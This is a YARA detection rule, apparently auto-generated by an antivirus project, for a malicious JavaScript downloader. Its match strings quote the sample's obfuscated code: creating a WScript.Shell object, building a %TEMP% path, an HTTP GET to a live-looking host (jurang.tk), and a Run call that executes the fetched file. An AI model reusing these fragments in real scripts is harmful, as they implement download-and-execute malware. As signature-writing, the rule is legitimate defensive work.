rule sig_20160427_6fe8753ad51d5bbb46427d280464c59e {
  meta:
    description = "datamaliciousorder - file 20160427_6fe8753ad51d5bbb46427d280464c59e.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "8b230b887b30d0905f5eb7ed13d6b8d999e342f8432958d24882adfe247ce855"

  strings:
    $s1  = "function AfgjiQcfzl() {return ZxboiAmdmd[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"UViJ2qY" ascii
    $s2  = "function AfgjiQcfzl() {return ZxboiAmdmd[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"UViJ2qY" ascii
    $s3  = "var ZxboiAmdmd = function ZbxyvMhdap() {return HgpncGukvv[IvxgfNaebe](\"WScript\"+\".Shell\");}(), QsdmoGjuny = 11;" fullword ascii
    $s4  = "function FzzrhOkyiw(AmogqRlbta, ZvsxiQbjvn){GegrsBxlmm = GegrsBxlmm * 1; return AmogqRlbta - ZvsxiQbjvn;};" fullword ascii
    $s5  = "LbtdxIhest[HsvnoMnjkt](\"G\" + \"ET\", \"http://jurang.tk/n2ysk\", false);" fullword ascii
    $s6  = "var HgpncGukvv = this[\"WScript\"];" fullword ascii
    $s7  = "if (LbtdxIhest[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s8  = "function GdrkcYgfdp(){return UqcryIpagi + \"\";};" fullword ascii
    $s9  = "function LzjjyLkeey() {return ((AvqsgQjcvq == true) && (AvqsgQjcvq == EjtvnVdatz)) ? 1 : GegrsBxlmm;};" fullword ascii
    $s10 = "function RnmnoLtwwj(AdqseTbjhu){ZxboiAmdmd[\"R\"+\"un\"](AdqseTbjhu, GegrsBxlmm, GegrsBxlmm);};" fullword ascii
    $s11 = "var KsukoYilqm = false;" fullword ascii
    $s12 = "EjtvnVdatz = true; " fullword ascii
    $s13 = "return FzzrhOkyiw(EgqaiJltvt, NaywmBcjpe);" fullword ascii
    $s14 = "AvqsgQjcvq = true; " fullword ascii
    $s15 = "function DmkefNvowy()" fullword ascii
    $s16 = "function CqkffFjqoz(MbadpFgton) {var QxunvZoxqk = (1, 2, 3, 4, 5, MbadpFgton); return QxunvZoxqk;};" fullword ascii
    $s17 = "var EjtvnVdatz = false;" fullword ascii
    $s18 = "KsukoYilqm = true;" fullword ascii
    $s19 = "function XarldZnqne(){return 23;};" fullword ascii
    $s20 = "function GdtieNxpcp(){return IvxgfNaebe;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}